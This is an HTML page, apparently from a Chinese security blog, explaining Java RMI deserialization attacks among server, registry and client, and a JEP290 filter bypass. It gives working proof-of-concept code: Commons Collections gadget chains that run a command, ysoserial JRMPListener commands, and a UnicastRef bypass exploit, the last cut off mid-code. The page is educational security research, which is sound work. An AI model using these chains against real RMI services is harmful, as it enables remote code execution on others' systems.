@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>RMI ATTACK - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "RMI ATTACK", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "RMI \u53cd\u5e8f\u5217\u5316\u653b\u51fb", url: "#rmi" },
+              {title: "JEP290", url: "#jep290" },
+              {title: "JEP290 BYPASS", url: "#jep290-bypass" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-link">
+        Gadget利用类总结
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-link">
+        JNDI注入原理浅析
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="rmi-attack">RMI ATTACK</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#RMI-反序列化攻击">RMI 反序列化攻击</a><ul>
+<li><a href="#服务端攻击注册端">服务端攻击注册端</a></li>
+<li><a href="#注册端攻击服务端">注册端攻击服务端</a></li>
+<li><a href="#服务端攻击客户端">服务端攻击客户端</a></li>
+<li><a href="#客户端攻击服务端">客户端攻击服务端</a></li>
+<li><a href="#客户端攻击注册端">客户端攻击注册端</a></li>
+<li><a href="#注册端攻击客户端">注册端攻击客户端</a></li>
+</ul>
+</li>
+<li><a href="#JEP290">JEP290</a><ul>
+<li><a href="#代码分析">代码分析</a></li>
+</ul>
+</li>
+<li><a href="#JEP290-BYPASS">JEP290 BYPASS</a><ul>
+<li><a href="#UnicastRefJDK8u231">UnicastRef（JDK&lt;=8u231）</a><ul>
+<li><a href="#LiveRef">LiveRef</a></li>
+<li><a href="#RemoteObjectInvocationHandler-">RemoteObjectInvocationHandler </a></li>
+<li><a href="#完整复现">完整复现</a></li>
+<li><a href="#仿写lookup实现">仿写lookup实现</a></li>
+<li><a href="#总结">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>引用自lala师傅</p>
+<p><img alt="" src="../image/image_6vQ8yJE2UH.png" /></p>
+<h2 id="rmi">RMI 反序列化攻击</h2>
+<p>RMI调用由三部分构成：服务端，客户端，注册端。而在RMI传输数据时，数据是以序列化的形式进行传输的，这就意味着RMI调用中存在反序列化的操作，这就给了反序列化攻击可乘之机。</p>
+<p><code>在高版本JDK中，注册端和服务端是必须在同一台服务器上的，这就意味着在高版本JDK中注册端打服务端或者服务端打攻击端没啥用。而在低版本中这两者是可以分离的，还算有攻击的可能。但总体来说这类攻击方法还是很鸡肋的。</code></p>
+<p>接下来会对攻击方和受害方的不同，分成6种攻击方式，如下。</p>
+<p>（除非特殊说明，否则下面说的都是8u66和CC1链）</p>
+<h3 id="_2">服务端攻击注册端</h3>
+<p>服务端在向注册端使用bind等函数操作远程对象时，会提供一段序列化数据，注册端获取到序列化数据后会进行反序列化操作，这中间就会有反序列化漏洞发生可能。</p>
+<p><img alt="" src="../image/image_o7HVhAX2cJ.png" /></p>
+<p>下面用CC1链去进行攻击，JDK版本8u66</p>
+<pre><code class="language-java">import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.util.HashMap;
+import java.util.Map;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+public class server {
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,
+                        new Class[] {String.class, Class[].class},
+                        new Object[] {&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,
+                        new Class[] {Object.class, Object[].class},
+                        new Object[] {null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] {String.class},
+                        new Object[] {&quot;calc&quot;})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        innerMap.put(&quot;value&quot;, &quot;123&quot;);
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        Class AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
+        cons.setAccessible(true);
+        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
+        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
+        Registry registry = LocateRegistry.createRegistry(3333);
+        Registry registry_remote = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 3333);
+        registry_remote.bind(&quot;HelloRegistry&quot;, proxyEvalObject);
+    }
+}
+
+</code></pre>
+<p><img alt="" src="../image/image_JVe5MTKT6c.png" /></p>
+<h3 id="_3">注册端攻击服务端</h3>
+<p>服务端在向注册端使用bind等函数操作远程对象时，会提供一段序列化数据，随后注册端也会向服务端发送一段序列化数据，服务端便会进行反序列化操作，其中便存在反序列化漏洞发生的可能。</p>
+<p>8u66</p>
+<pre><code class="language-java">import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class server {
+    public static void main(String[] args) throws Exception{
+        String url = &quot;rmi://127.0.0.1:1234/setUser&quot;;
+        user user = new userImpl();
+        LocateRegistry.createRegistry(12345);
+        Naming.unbind(url);
+        System.out.println(&quot;Server Running At：&quot; + url);
+    }
+}
+</code></pre>
+<p>同时ysoserial开启恶意JRMP注册端，提供cc1链。</p>
+<pre><code class="language-java">java -cp .\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections1 &quot;calc&quot;
+</code></pre>
+<p><img alt="" src="../image/image_9WFjcEqzqH.png" /></p>
+<h3 id="_4">服务端攻击客户端</h3>
+<p>RMI中，客户端和服务端的交互也是由序列化数据传输来进行的，所以服务端与客户端之间也存在相互反序列化攻击的可能。</p>
+<p>服务端</p>
+<pre><code class="language-java">import java.lang.reflect.InvocationHandler;
+import java.rmi.Remote;
+
+public interface user extends Remote{
+    public InvocationHandler exp() throws Exception;
+}
+
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class userImpl extends UnicastRemoteObject implements user{ //定义一个远程接口实现类,注意这个远程实现类必须继承自UnicastRemoteObject,不然服务端不会发送该类的对象的存根(stub(下文讲))
+    protected userImpl RemoteException;
+
+    protected userImpl() throws RemoteException {
+    }
+
+    public InvocationHandler exp() throws Exception{
+        ChainedTransformer chainedTransformer= new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, new Object[]{&quot;calc.exe&quot;})});
+
+        Map innermap = new HashMap();
+        Map outermap = LazyMap.decorate(innermap, chainedTransformer);
+
+        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
+        cons.setAccessible(true);
+//妙处
+        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//获得一个AnnotationInvocationHandler对象
+        Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法
+        InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox);  //将代理Map传入，当代理Map被执行任一方法时，执行invoke方法
+
+        return handler1;
+    }
+}
+
+
+
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class server {
+    public static void main(String[] args) throws Exception{
+        String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
+        user user = new userImpl();
+        LocateRegistry.createRegistry(23335);
+        Naming.bind(url,user);
+        System.out.println(&quot;Server Running At：&quot; + url);
+    }
+}
+
+</code></pre>
+<p>客户端</p>
+<pre><code class="language-java">import java.lang.reflect.InvocationHandler;
+import java.rmi.Remote;
+
+public interface user extends Remote{
+    public InvocationHandler exp() throws Exception;
+}
+
+
+import java.rmi.Naming;
+
+public class client {
+    public static void main(String[] args){
+        try{
+            String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
+            user user = (user)Naming.lookup(url);
+            Object ob = user.exp();
+            System.out.println(ob);
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+
+
+</code></pre>
+<p>先启动服务端再启动客户端就能弹计算器辣</p>
+<p><img alt="" src="../image/image_wTrpaIOTk7.png" /></p>
+<h3 id="_5">客户端攻击服务端</h3>
+<p>原理同上，不再说了。</p>
+<p>服务端</p>
+<pre><code class="language-java">import java.lang.reflect.InvocationHandler;
+import java.rmi.Remote;
+
+public interface user extends Remote{
+    public void exp(Object a) throws Exception;
+}
+
+
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+
+public class userImpl extends UnicastRemoteObject implements user{ //定义一个远程接口实现类,注意这个远程实现类必须继承自UnicastRemoteObject,不然服务端不会发送该类的对象的存根(stub(下文讲))
+    protected userImpl RemoteException;
+
+    protected userImpl() throws RemoteException {
+    }
+
+    public void exp(Object a) throws Exception{
+        System.out.println(&quot;123&quot;);
+    }
+}
+
+
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class server {
+    public static void main(String[] args) throws Exception{
+        String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
+        user user = new userImpl();
+        LocateRegistry.createRegistry(23335);
+        Naming.bind(url,user);
+        System.out.println(&quot;Server Running At：&quot; + url);
+    }
+}
+
+</code></pre>
+<p>客户端</p>
+<pre><code class="language-java">import java.rmi.Remote;
+
+public interface user extends Remote{
+    public void exp(Object a) throws Exception;
+}
+
+
+import java.rmi.Naming;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class client {
+    public static void main(String[] args){
+        try{
+            String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
+            user user = (user)Naming.lookup(url);
+
+            ChainedTransformer chainedTransformer= new ChainedTransformer(new Transformer[] {
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                            String.class, Class[].class }, new Object[] {
+                            &quot;getRuntime&quot;, new Class[0] }),
+                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                            Object.class, Object[].class }, new Object[] {
+                            null, new Object[0] }),
+                    new InvokerTransformer(&quot;exec&quot;,
+                            new Class[] { String.class }, new Object[]{&quot;calc.exe&quot;})});
+
+            Map innermap = new HashMap();
+            Map outermap = LazyMap.decorate(innermap, chainedTransformer);
+
+            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+            Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
+            cons.setAccessible(true);
+//妙处
+            InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//获得一个AnnotationInvocationHandler对象
+            Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法
+            InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox);
+
+
+            user.exp(handler1);
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+
+
+</code></pre>
+<p><img alt="" src="../image/image_D6vRBTqYx9.png" /></p>
+<h3 id="_6">客户端攻击注册端</h3>
+<p>在客户端向注册端发送查询请求时，会使用到lookup函数。
+我们对lookup函数进行动态调试跟进，会来到这个地方。</p>
+<p><img alt="" src="../image/image_ragU0dRHKr.png" /></p>
+<p>可以清晰地发现存在一个序列化方法writeObject，其中var1便是lookup方法中传入的字符串。var1在进行序列化后会在后面的ref.invoke(var2)处发送给服务端，服务端会反序列化这段数据，给了反序列化攻击产生的机会：我们可以仿写一个lookup方法，给var1赋值为恶意数据发送给服务端，造成攻击。</p>
+<p>下面这段代码是我在先知上嫖的。<a href="https://xz.aliyun.com/t/8706#toc-9" title="https://xz.aliyun.com/t/8706#toc-9">https://xz.aliyun.com/t/8706#toc-9</a></p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import sun.rmi.server.UnicastRef;
+
+import java.io.ObjectOutput;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.Operation;
+import java.rmi.server.RemoteCall;
+import java.rmi.server.RemoteObject;
+import java.util.HashMap;
+import java.util.Map;
+
+public class client {
+    public static void main(String[] args) throws Exception {
+
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,
+                        new Class[] {String.class, Class[].class},
+                        new Object[] {&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,
+                        new Class[] {Object.class, Object[].class},
+                        new Object[] {null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] {String.class},
+                        new Object[] {&quot;calc&quot;})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        innerMap.put(&quot;value&quot;, &quot;Threezh1&quot;);
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        Class AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
+        cons.setAccessible(true);
+        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
+        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
+        Registry registry_remote = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 23335);
+
+        // 获取super.ref
+        Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields();
+        fields_0[0].setAccessible(true);
+        UnicastRef ref = (UnicastRef) fields_0[0].get(registry_remote);
+
+        // 获取operations
+        Field[] fields_1 = registry_remote.getClass().getDeclaredFields();
+        fields_1[0].setAccessible(true);
+        Operation[] operations = (Operation[]) fields_1[0].get(registry_remote);
+
+        // 跟lookup方法一样的传值过程
+        RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L);
+        ObjectOutput var3 = var2.getOutputStream();
+        var3.writeObject(proxyEvalObject);
+        ref.invoke(var2);
+
+        registry_remote.lookup(&quot;HelloRegistry&quot;);
+        System.out.println(&quot;rmi start at 3333&quot;);
+    }
+}
+</code></pre>
+<h3 id="_7">注册端攻击客户端</h3>
+<p>客户端向注册端调用list，lookup等函数查询服务后，注册端会返回查询结果的序列化形式给客户端，客户端收到后会进行反序列化操作，这就存在反序列化攻击的可能，</p>
+<pre><code class="language-java">public class client {
+    public static void main(String[] args){
+        try{
+            String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
+            user user = (user)Naming.lookup(url);
+
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>ysoserial开启恶意注册端</p>
+<pre><code class="language-java">java -cp .\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 23335 CommonsCollections1 &quot;calc&quot;
+</code></pre>
+<h2 id="jep290">JEP290</h2>
+<p>在JDK8u121，JDK7u13，JDK6u141之后添加了一个新的安全机制JEP-290</p>
+<p>在JDK8u121，JDK7u13，JDK6u141之后添加了一个新的安全机制JEP-290，它提供了一个接口<code>ObjectInputFilter</code>，可以通过这个接口来实现反序列化时依照白名单实现类的过滤。</p>
+<p>RMI过程中默认有过滤器，<code>RegistryImpl#registryFilter</code></p>
+<p><img alt="" src="../image/image_WDfgqVN-M8.png" /></p>
+<p>可以发现白名单类有这些</p>
+<pre><code class="language-java">String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory /  ActivationID / UID
+</code></pre>
+<p>只要在反序列化过程中出现的类不是上述类，就会抛出REJECTED异常</p>
+<p>下面是我在8u181 发起客户端攻击注册端时抛出的REJECTED异常。</p>
+<p><img alt="" src="../image/image_r-j9oSFl0-.png" /></p>
+<h3 id="_8">代码分析</h3>
+<p>RMI的过滤器是如何发挥作用的呢？带着这个疑问，我们去调试一下代码。</p>
+<p>假设此时客户端仿写lookup方法向注册端发送了一个对象，或者服务端向注册端发送了一个bind/rebind请求，注册端便会调用UnicastServerRef来处理请求。</p>
+<p><img alt="" src="../image/image_nJ2YhSOT1K.png" /></p>
+<p>跟进这个UnicastServerRef#oldDispatch方法：</p>
+<p><img alt="" src="../image/image_B62VdfOM4O.png" /></p>
+<p>在oldDispatch倒数第二排代码，调用了UnicastServerRef#unmarshalCustomCallData方法，跟进一下</p>
+<p><img alt="" src="../image/image_Gvqsrois9N.png" /></p>
+<p>可以看见该方法使用了setObjectInputFilter方法，而这个方法是用作于给序列化数据增加过滤器的</p>
+<p><img alt="" src="../image/image_LOhhM-paFH.png" /></p>
+<p>这里便是为当前序列化流增加了UnicastServerRef.this.filter这个过滤器。</p>
+<blockquote>
+<p>📌那么UnicastServerRef.this.filter这个值又是哪里来的呢？
+答案是在调用getRegistry时UnicastServerRef便被初始化了，其filter值也被进行了赋值(Naming.bind 会自动调用 LocateRegistry.getRegistry)。
+如下图便是跟进LocateRegistry.getRegistry方法后的代码，此处实例化了一个UnicastServerRef对象。</p>
+</blockquote>
+<p><img alt="" src="../image/image_MI9u5cPp8-.png" /></p>
+<p><img alt="" src="../image/image_dr60ObgUcs.png" /></p>
+<blockquote>
+<p>所以UnicastServerRef.this.filter的值便是RegistryImpl#registryFilter</p>
+</blockquote>
+<p>在调用unmarshalCustomCallData设置好当前序列化流的过滤器后，程序再开始调用RegistryImpl_Skel#dispatch来进行反序列化操作</p>
+<p><img alt="" src="../image/image_0IIugJ7ir_.png" /></p>
+<p>在readObject方法中会判断当前序列化流是否配置有过滤器，如果有过滤器就在下面用checkInput对序列化流进行过滤。而checkInput实质是是调用序列化流的过滤器来进行过滤</p>
+<p><img alt="" src="../image/image_DRIU9OzYne.png" /></p>
+<p>下图是从反序列化到过滤的栈帧。</p>
+<p><img alt="" src="../image/image_HQCP7-fVSl.png" /></p>
+<h2 id="jep290-bypass">JEP290 BYPASS</h2>
+<h3 id="unicastrefjdk8u231">UnicastRef（JDK&lt;=8u231）</h3>
+<p>RegistryImpl_stub过滤中的白名单类中有UnicastRef 类，我们可以在这个类上下文章绕过JEP290.</p>
+<blockquote>
+<p>这里先来把该攻击方法的大致轮廓勾勒出来，方便阅读下面的内容：
+首先我们向注册端发送一个恶意对象
+该对象能在被反序列化时主动向一个恶意注册端发起通讯并反序列化其传送过来的内容，此过程的反序列化没有经过Filter检验
+完成攻击</p>
+</blockquote>
+<p>我所进行调试的代码如下</p>
+<pre><code class="language-java">import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class server {
+    public static void main(String[] args) throws Exception{
+        String url = &quot;rmi://127.0.0.1:1069/user&quot;;
+        user user = new userImpl();
+        LocateRegistry.createRegistry(1069);
+        Naming.bind(url,user);
+        System.out.println(&quot;Server Running At：&quot; + url);
+        System.out.println(1);
+    }
+}
+</code></pre>
+<p>客户端的exp如下，我们可以跟着exp中的内容抽丝剥茧的分析</p>
+<pre><code class="language-java">ublic class client {
+    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {
+
+        Registry reg = LocateRegistry.getRegistry(&quot;localhost&quot;,1069);
+        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+        TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 8888);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+        reg.bind(&quot;test12&quot;,proxy);
+
+    }
+
+}
+</code></pre>
+<h4 id="liveref">LiveRef</h4>
+<p>我们先来看看LiveRef，这对象是RMI通讯中比较核心的部分，它记录了注册端的各种信息。我们通过以下内容来看LiveRef是如何定位注册端的，为我们撰写EXP时通过LiveRef定位恶意注册端做铺垫。</p>
+<p>在Naming.lookup 或者 Naming.bind方法中，都会先通过getRegistry方法获取注册端。</p>
+<p><img alt="" src="../image/image_ojU7oGHoPl.png" /></p>
+<p><img alt="" src="../image/image_fhjlQp5e_7.png" /></p>
+<p>而getRegistry返回的对象是一个封装了的UnicastRef对象，UnicastRef中封装了LiveRef对象，存储了注册端信息。
+所以实际上注册端信息是由封装在UnicastRef对象中的LiveRef对象来存储的。</p>
+<p><img alt="" src="../image/image_ZO97iVRP4k.png" /></p>
+<p>在bind方法执行时，会先通过UnicastRef.newcall利用LiveRef存储的注册端信息去定位注册端</p>
+<p><img alt="" src="../image/image_CvEj6AUxGg.png" /></p>
+<p>那么LiveRef中存储的信息（ep,id,islocal)是从哪来的呢？我们就需要去看看UnicastRef是如何初始化LiveRef这个类的。</p>
+<p>于UnicastRef#UnicastRef(LiveRef var1)与服务端bind处下断点，当断点在bind处停下时使其继续运行到UnicastRef#UnicastRef(LiveRef var1。我们可以看到如下栈帧</p>
+<p><img alt="" src="../image/image_1Fnc8uY0CD.png" /></p>
+<p>在LocateRegistry#getRegistry 处会实例化LiveRef并传入参数，然后用此LiveRef对象实例化UnicastRef。</p>
+<p>我们看看实例化LiveRef时传入的前两个参数。</p>
+<p>先来看objid，这里的ObjID。REGISTRY_ID是一个固定值0</p>
+<p><img alt="" src="../image/image_LpgL1WLIVo.png" /></p>
+<p>再来看看TCPEndpoint，传入TCPEndpoint的参数分别是从rmi地址字符串中读取的host，port以及两个null值（csf固定为null）</p>
+<p><img alt="" src="../image/image_6Qq1WAa96h.png" /></p>
+<p><img alt="" src="../image/image_geiDF3C7l0.png" /></p>
+<p>到这里就明白了LiveRef是如何定位注册端的了。</p>
+<h4 id="remoteobjectinvocationhandler">RemoteObjectInvocationHandler&#x20;</h4>
+<p>RemoteObjectInvocationHandler 这个对象是Remote的子类，所以是可以通过RMI的过滤检测的。</p>
+<p>exp运行后，当注册端反序列化时，会调用RemoteObjectInvocationHandler父类RemoteObject的readObject方法（因为RemoteObjectInvocationHandler自身并无readObject方法），在RemoteObject的readObject方法末行有一个ref.readExternal(in)</p>
+<p><img alt="" src="../image/image_FQvnbioCOj.png" /></p>
+<p>跟进该方法</p>
+<p><img alt="" src="../image/image_sHkw71kWPO.png" /></p>
+<p>调用了LiveRef的静态方法read，跟进该方法</p>
+<p><img alt="" src="../image/image_xmBaoIDE2t.png" /></p>
+<p>发现这个方法会根据序列化流中的内容还原出LiveRef对象，还原出的LiveRef对象中记录了恶意注册端的IP和端口号等信息。</p>
+<p>然后再经过一系列的流程，会调用到DGCClient#registerRefs</p>
+<p><img alt="" src="../image/image_KTpiu0tGg4.png" /></p>
+<p>56行以LiveRef中记录的恶意注册端地址为参数，调用了DGCClient.EndpointEntry.lookup，返回了一个封装了恶意注册端地址的DGCClient对象。
+然后调用了该DGCClient对象的registerRefs方法。跟进</p>
+<p><img alt="" src="../image/image_b2YzUrp66H.png" /></p>
+<p>再DGCClient#registerRefs 末行会调用一个makeDirtyCall方法，其中var2封装了指向恶意注册端的LiveRef对象，跟进</p>
+<p><img alt="" src="../image/image_zvUxKF5tbU.png" /></p>
+<p>然后会调用一个this.dgc.dirty方法，this.dgc中封装了指向恶意注册端的LiveRef，跟进</p>
+<p><img alt="" src="../image/image_Ju_oQPup9l.png" /></p>
+<p>此处的代码（DGCImpl_stub#dirty）就很像&#x20;
+该方法会先向恶意注册端建立通讯，发送序列化信息，接收注册端传来的信息并进行反序列化。在该readObject进行反序列化时并没有设置过滤器，所以自然而然地便绕过了RMI通讯中JEP290设置的过滤器的检测，从而可以反序列化任何恶意注册端传来的序列化流，造成反序列化攻击。</p>
+<h4 id="_9">完整复现</h4>
+<p>首先开启注册端，user类的具体代码就不贴了，注册端端口为1069</p>
+<pre><code class="language-java">import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class server {
+    public static void main(String[] args) throws Exception{
+        String url = &quot;rmi://127.0.0.1:1069/user&quot;;
+        user user = new userImpl();
+        LocateRegistry.createRegistry(1069);
+        Naming.bind(url,user);
+        System.out.println(&quot;Server Running At：&quot; + url);
+        System.out.println(1);
+    }
+}
+</code></pre>
+<p>客户端代码</p>
+<pre><code class="language-java">import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
+
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.ObjID;
+import java.rmi.server.RemoteObjectInvocationHandler;
+import java.util.Random;
+
+
+public class client {
+    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {
+
+        Registry reg = LocateRegistry.getRegistry(&quot;localhost&quot;,1069);
+        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+        TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 8888);
